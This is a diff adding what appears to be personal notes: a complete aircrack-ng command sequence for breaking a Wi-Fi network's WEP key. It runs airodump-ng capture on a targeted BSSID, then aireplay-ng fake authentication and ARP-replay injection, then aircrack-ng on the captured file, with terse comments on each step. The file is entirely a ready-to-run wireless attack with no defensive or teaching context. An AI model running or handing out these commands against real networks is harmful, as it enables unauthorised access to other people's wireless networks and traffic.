@@ -1,0 +1,16 @@
+airodump-ng --bssid DC:1A:C5:7C:CB:71 --channel 11  wlx1cbfce04e4dd --write arpreplay
+
+aireplay-ng --fakeauth 0 -a DC:1A:C5:7C:CB:71 -h 1C:BF:CE:04:E4:DD wlx1cbfce04e4dd
+    >this will create fake authentication
+
+aireplay-ng --arpreplay -b DC:1A:C5:7C:CB:71 -h 1C:BF:CE:04:E4:DD wlx1cbfce04e4dd
+    >this will create traffic and increase data flow 
+     for this you have to wait...
+
+after the trafic rises
+
+aireplay-ng --fakeauth 0 -a DC:1A:C5:7C:CB:71 -h 1C:BF:CE:04:E4:DD wlx1cbfce04e4dd
+
+aircrack-ng arpreplay-01.cap
+
+
